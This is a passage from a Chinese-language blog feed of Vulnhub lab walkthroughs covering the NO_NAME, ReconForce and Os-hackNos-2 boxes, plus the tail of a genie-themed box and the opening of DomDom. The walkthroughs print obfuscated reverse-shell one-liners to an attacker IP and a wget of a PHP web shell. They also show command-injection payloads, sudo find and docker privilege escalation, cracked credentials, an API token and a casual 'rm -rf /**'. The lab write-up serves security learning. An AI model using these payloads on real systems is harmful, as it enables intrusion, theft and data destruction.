res_str.split(<span class="string">','</span>)</span><br><span class="line">    n1 = nums[<span class="number">0</span>].strip()</span><br><span class="line">    operator=nums[<span class="number">1</span>].strip()</span><br><span class="line">    n2 = nums[<span class="number">2</span>].strip()</span><br><span class="line">    <span class="keyword">return</span> eval(n1+operator+n2)</span><br><span class="line"></span><br><span class="line">print(main())</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210927123344452.png" alt="image-20210927123344452"></p>
</blockquote>
<p>接着我们就获得了ssh端口的暗语，之前ssh端口是扫不出来的，现在用knock打开ssh端口</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">knock 192.168.56.111 1356 6784 3409</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210927123443849.png" alt="image-20210927123443849"></p>
<p>4、因为开启了21端口，并且nmap扫出用户ftp，无密码，我们连接获取了三个文本将其下载查看</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210927124214447.png" alt="image-20210927124214447"></p>
</blockquote>
<p>5、这里给出了一些账号和密码，因为我们玩游戏已经打开了22端口，之后可以尝试登陆</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210927124334557.png" alt="image-20210927124334557"></p>
</blockquote>
<p>6、接着看看7331端口是个网页，我们扫一下目录，在wish目录中发现命令执行</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.56.111:7331&#x2F;wish</span><br></pre></td></tr></table></figure></div>

<p>7、通过burp中fuzz发现管道符没过滤，可以直接反弹shell利用base64转换</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">echo &quot;YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTkyLjE2OC41Ni4xLzEyMzQgMD4mMScK&quot;|base64 -d|bash</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210927165623290.png" alt="image-20210927165623290"></p>
</blockquote>
<p>8、接着分析app.py的内容，有一个/home/nitish/.dev/creds.txt目录，其中有我们想要的账号和密码，发现有一个genie可以执行sam的权限</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">nitish:p4ssw0rdStr3r0n9</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210927170830417.png" alt="image-20210927170830417"></p>
</blockquote>
<p>9、用man查看genie的使用方法，发现有-cmd可以进入bash所以直接换用户，接着又发现无需密码可以执行root权限/root/lago</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">man genie</span><br><span class="line">sudo -u sam genie -cmd whoami #转入sam用户</span><br></pre></td></tr></table></figure></div>

<p>10、可以在/home/sam中发现.pyc是python2.7写的，我们试着反编译</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">file .pyc</span><br></pre></td></tr></table></figure></div>

<p>这里要用到一个工具uncompyle6来进行反编译，这里说一些安装的坑</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">pip install uncompyle6</span><br><span class="line">uncompyle6</span><br></pre></td></tr></table></figure></div>

<p>如果遇到报错的话，可能是你python3.9版本过高，需要调一下，加一个3.9，不然无法执行</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">linux中就改这个</span><br><span class="line">vim &#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.9&#x2F;dist-packages&#x2F;uncompyle6&#x2F;bin&#x2F;uncompile.py</span><br><span class="line"></span><br><span class="line">windows就改这个</span><br><span class="line">C:\python30\Lib\site-packages\uncompyle6\bin</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210927174200267.png" alt="image-20210927174200267"></p>
</blockquote>
<p>接着将我们的.pyc反编译成1.py</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">uncompyle6  -o 1.py .pyc</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210927174540927.png" alt="image-20210927174540927"></p>
</blockquote>
<p>接着发现这个源代码就是可以执行root权限的那个lago的源码，我们仔细看看，我只截取重要的</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">def guessit():</span><br><span class="line">    num &#x3D; randint(1, 101)</span><br><span class="line">    print &#39;Choose a number between 1 to 100: &#39;</span><br><span class="line">    s &#x3D; input(&#39;Enter your number: &#39;)</span><br><span class="line">    if s &#x3D;&#x3D; num:</span><br><span class="line">        system(&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">    else:</span><br><span class="line">        print &#39;Better Luck next time&#39;</span><br></pre></td></tr></table></figure></div>

<p>发现如果我们输入num 的话就可以执行/bin/sh，这就拿到root权限了（考点就是反编译）</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">sudo -u root &#x2F;root&#x2F;lago #进入猜数字</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210927175111741.png" alt="image-20210927175111741"></p>
</blockquote>
<p>结果</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210927175213178.png" alt="image-20210927175213178"></p>
</blockquote>
<p>也可以看到1337的程序是xinetd，可以再cat /opt/1337/app.py这个目录中查看到1337端口的对应计算的代码获取</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">netstat -lntp</span><br><span class="line">locate xinetd</span><br></pre></td></tr></table></figure></div>

<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>内网渗透</tag>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>【Vulnhub】靶机HACLAS-NO-NAME</title>
    <url>/posts/155.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>Vulnhub刷题简单记录</li>
</ul>
</blockquote>
<h2 id="NO-NAME"><a href="#NO-NAME" class="headerlink" title="NO_NAME"></a>NO_NAME</h2><blockquote>
<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>这是一台初学者级别的机器，获得外壳有点困难，只要想开箱即用即可获得外壳。一旦获得外壳，权限提升就很容易。</p>
<p>这台机器有3个标志。每个标志都存在于特定用户的主目录中。准备好测试您的 Linux 技能。</p>
<p>初级/中级</p>
</blockquote>
<h2 id="NO-NAME开始"><a href="#NO-NAME开始" class="headerlink" title="NO_NAME开始"></a>NO_NAME开始</h2><p>1、可以用两种方法确认靶场的存在，扫ip</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.56.0&#x2F;24</span><br><span class="line">nmap -sn 192.168.56.0&#x2F;24</span><br></pre></td></tr></table></figure></div>

<p>2、扫目标端口开发情况</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC 192.168.56.109 -oA R</span><br><span class="line">.&#x2F;nmapAutomator.sh -H 192.168.56.109 -t recon</span><br></pre></td></tr></table></figure></div>

<p>3、访问主页，爆破目录，指定扫描php，这里用最大的字典，发现了superadmin.php</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;192.168.56.109 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;big.txt -t 100 -x php</span><br></pre></td></tr></table></figure></div>

<p>4、在此目录发现了命令执行漏洞，通过cat查看源代码，发现过滤了一些字符，这里给出两种方法解决</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">|| cat superadmin.php</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210926135855048.png" alt="image-20210926135855048"></p>
</blockquote>
<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>①、<strong>首先将我们的反弹代码转换为16进制</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210926135956216.png" alt="image-20210926135956216"></p>
</blockquote>
<p>②、利用xxd将其转换为ascii码字符，然后通过bash执行反弹成功，payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">echo &quot;62617368202d6920263e2f6465762f7463702f3139322e3136382e35362e312f3132333420303e2631&quot;|xxd -r -p|bash</span><br></pre></td></tr></table></figure></div>

<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>①、将其转换为base64</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">||echo &quot;YmFzaCAtaSAmPi9kZXYvdGNwLzE5Mi4xNjguNTYuMS8xMjM0IDA+JjEK&quot; |base64 -d|bash</span><br></pre></td></tr></table></figure></div>

<p>拿到shell之后，在home目录中找到yash的flag，提示说有一个隐藏文件</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210926142259849.png" alt="image-20210926142259849"></p>
</blockquote>
<p>这里我们就用find来寻找yash用户创建的文件，里面藏有密码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -name &quot;*pass*&quot; -type f -user yash 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure></div>

<p>找到了/usr/share/hidden/.passwd目录，发现了另一个用户的密码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">haclabs:haclabs1234</span><br></pre></td></tr></table></figure></div>

<p>5、提权，接着发现可以无密码执行find</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210926142643706.png" alt="image-20210926142643706"></p>
</blockquote>
<p>简单的find提权</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">sudo find -exec &#x2F;bin&#x2F;bash \;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210926143359326.png" alt="image-20210926143359326"></p>
</blockquote>
<p>提权方式二suid</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure></div>

<p>直接用下面命令，记得要加-p才能成功，或者直接反弹shell也行</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">find sky -exec &#x2F;bin&#x2F;bash -p \;</span><br></pre></td></tr></table></figure></div>

<p>你如果闲的蛋疼也可以删除所有东西</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">rm -rf &#x2F;**</span><br></pre></td></tr></table></figure></div>



<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>内网渗透</tag>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>【Vulnhub】靶机ReconForce</title>
    <url>/posts/158.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>Vulnhub刷题简单记录</li>
</ul>
</blockquote>
<h2 id="ReconForce"><a href="#ReconForce" class="headerlink" title="ReconForce"></a>ReconForce</h2><blockquote>
<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>良好的枚举技巧</p>
<p>难度：容易中级</p>
<p>Flag: 2 标记第一个用户和第二个根用户</p>
<p>学习：Web 应用程序 | 枚举 | 权限提升</p>
</blockquote>
<h2 id="ReconForce开始"><a href="#ReconForce开始" class="headerlink" title="ReconForce开始"></a>ReconForce开始</h2><p>1、可以用两种方法确认靶场的存在，扫ip</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.56.0&#x2F;24</span><br><span class="line">nmap -sn 192.168.56.0&#x2F;24</span><br></pre></td></tr></table></figure></div>

<p>2、扫目标端口开发情况</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC 192.168.56.108 -oA R</span><br><span class="line">.&#x2F;nmapAutomator.sh -H 192.168.56.108 -t recon</span><br></pre></td></tr></table></figure></div>

<p>3、访问主页，爆破目录，指定扫描php</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;192.168.56.106 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt -t 100 -x php</span><br><span class="line"></span><br><span class="line">dirb http:&#x2F;&#x2F;192.168.56.108&#x2F;</span><br><span class="line"></span><br><span class="line">dirsearch http:&#x2F;&#x2F;192.168.56.108&#x2F; -e* -x 403 -r</span><br></pre></td></tr></table></figure></div>

<p>4、没有扫出什么，登陆ftp端口发现有用户Security@hackNos</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210926104813010.png" alt="image-20210926104813010"></p>
</blockquote>
<p>5、在登陆页面尝试爆破，用收集来的信息</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">word&#x3D;[&quot;Recon&quot;,&quot;Security&quot;,&quot;hackNos&quot;,&quot;5ecure&quot;]</span><br><span class="line">for i in word:</span><br><span class="line">    print(i+&quot;@hackNos&quot;)</span><br></pre></td></tr></table></figure></div>

<p>输出</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">Recon@hackNos</span><br><span class="line">Security@hackNos</span><br><span class="line">hackNos@hackNos</span><br><span class="line">5ecure@hackNos</span><br></pre></td></tr></table></figure></div>

<p>练习一下msf的auth验证模块爆破登陆</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;http&#x2F;http_login</span><br><span class="line">options</span><br><span class="line">set AUTH_URI &#x2F;5ecure&#x2F;</span><br><span class="line">set STOP_ON_SUCCESS YES</span><br><span class="line">options</span><br><span class="line">set PASS_FILE &#x2F;root&#x2F;BC&#x2F;R&#x2F;pass</span><br><span class="line">options</span><br><span class="line">set rhosts 192.168.56.108</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210926104955430.png" alt="image-20210926104955430"></p>
</blockquote>
<p>接着登陆利用||的特性来进行命令执行（特性是前面的命令执行失败，再执行后面的命令）</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210926105029720.png" alt="image-20210926105029720"></p>
</blockquote>
<p>明显命令执行漏洞，接着用wget上传木马</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210926105047222.png" alt="image-20210926105047222"></p>
</blockquote>
<p>这是cat查看的过滤规则，所以正常的反弹会失败</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; Set blacklist</span><br><span class="line">$substitutions &#x3D; array(</span><br><span class="line">    &#39;&amp;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    &#39;;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    &#39;| &#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    &#39;-&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    &#39;$&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    &#39;(&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    &#39;)&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    &#39;&#96;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    &#39;||&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>

<p>给他上传一个一句话木马</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">|| wget http:&#x2F;&#x2F;192.168.56.1:8000&#x2F;shell.php</span><br></pre></td></tr></table></figure></div>

<p>接着反弹shell，骚姿势</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">echo &quot;62617368202d6920263e2f6465762f7463702f3139322e3136382e35362e312f3132333420303e2631&quot; |xxd -r -p|bash</span><br></pre></td></tr></table></figure></div>

<p>拿到shell之后，为了防止乱码，可以使用ctrl+Z，然后再使用下面命令</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">stty raw -echo</span><br><span class="line">nc -lvvp 1234 #返回终端</span><br></pre></td></tr></table></figure></div>

<p>查看etc/passwd,发现有两个bash用户</p>
<p>还有一个recon，可以试试刚刚登陆的密码，或者爆破一下，发现可以登录</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210926111955675.png" alt="image-20210926111955675"></p>
</blockquote>
<p><strong>接着发现recon用户可以直接提权</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210926112127348.png" alt="image-20210926112127348"></p>
</blockquote>
<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p><strong>docker提权</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">docker run -v &#x2F;:&#x2F;mnt --rm -it alpine chroot &#x2F;mnt sh</span><br><span class="line">docker images</span><br><span class="line">docker run -it -v &#x2F;:&#x2F;mbt ae7952123bc6  #加载这台主机的根目录</span><br></pre></td></tr></table></figure></div>



<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>内网渗透</tag>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>【Vulnhub】靶机Os-hackNos-2</title>
    <url>/posts/154.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>Vulnhub刷题简单记录</li>
</ul>
</blockquote>
<h2 id="Os-hackNos-2开始"><a href="#Os-hackNos-2开始" class="headerlink" title="Os-hackNos-2开始"></a>Os-hackNos-2开始</h2><p>1、可以用两种方法确认靶场的存在，扫ip</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.56.0&#x2F;24</span><br><span class="line">nmap -sn 192.168.56.0&#x2F;24</span><br></pre></td></tr></table></figure></div>

<p>2、扫目标端口开发情况</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">nmap -p- -T5 -A 192.168.56.107 -oA dom</span><br></pre></td></tr></table></figure></div>

<p>3、访问主页，爆破目录，接着发现他wp的框架</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;192.168.56.107 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt -t 100</span><br><span class="line"></span><br><span class="line">dirb http:&#x2F;&#x2F;192.168.56.107&#x2F;</span><br><span class="line"></span><br><span class="line">dirsearch -u http:&#x2F;&#x2F;192.168.56.107&#x2F; -e* -r</span><br></pre></td></tr></table></figure></div>

<p>4、接着用wpscan扫出LFI漏洞</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;192.168.56.107&#x2F;tsweb&#x2F; -e vp --api-token uRtscTsMbaEcsD0aaBjMdWOeFskt4NgsOnmOv1gHKI0</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210926093050852.png" alt="image-20210926093050852"></p>
</blockquote>
<p>获得flag用户的密码密文，准备破解用john</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">$1$flag$vqjCxzjtRc7PofLYS2lWf&#x2F;</span><br><span class="line"></span><br><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt passwd</span><br><span class="line"></span><br><span class="line">john --show passwd</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210926095320734.png" alt="image-20210926095320734"></p>
</blockquote>
<p>接着就登录了topsecret</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210926095423871.png" alt="image-20210926095423871"></p>
</blockquote>
<p>5、接着在网站目录中找到备份文件中有一个rohit用户的md5hash值</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">用john破解</span><br><span class="line">!%hack41</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210926100529851.png" alt="image-20210926100529851"></p>
</blockquote>
<p>接着用拿到root权限</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">sudo su root</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210926100645618.png" alt="image-20210926100645618"></p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>内网渗透</tag>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>【Vulnhub】靶机DomDom</title>
    <url>/posts/153.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>Vulnhub刷题简单记录</li>
</ul>
</blockquote>
<h2 id="DOMDOM"><a href="#DOMDOM" class="headerlink" title="DOMDOM"></a>DOMDOM</h2><blockquote>
<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><ul>
<li><p>您对 PHP 程序的了解程度如何？您对 Linux 错误配置的熟悉程度如何？此图片将涵盖高级 Web 攻击、开箱即用的思维和最新的安全漏洞。</p>
<p>请注意，这是捕获标志机，这意味着它不是现实生活中的场景，但会在您获得 root 权限之前向您发起挑战。</p>
</li>
</ul>
</blockquote>
